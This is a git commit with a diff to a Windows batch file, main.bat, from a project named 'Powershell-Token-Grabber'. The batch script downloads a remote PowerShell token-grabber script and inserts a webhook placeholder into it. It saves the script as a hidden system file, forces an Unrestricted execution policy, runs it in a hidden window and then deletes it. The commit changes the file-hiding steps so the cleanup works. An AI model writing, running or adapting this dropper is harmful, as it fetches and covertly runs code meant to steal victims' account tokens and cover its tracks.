07b3a5827bc01bba86827197ed626f48336ad715
kdot227 <damndc227@gmail.com>
2023-05-26 12:45:24 -0500

    fix del file error

--- main.bat
+++ main.bat
@@ -5,9 +5,10 @@ if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Co
 cd /d %~dp0
 
 powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
-attrib +h powershell123.ps1
+attrib +h +s powershell123.ps1
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
+attrib -h -s powershell123.ps1
 del powershell123.ps1 /f /q
 timeout 3 > nul
 exit
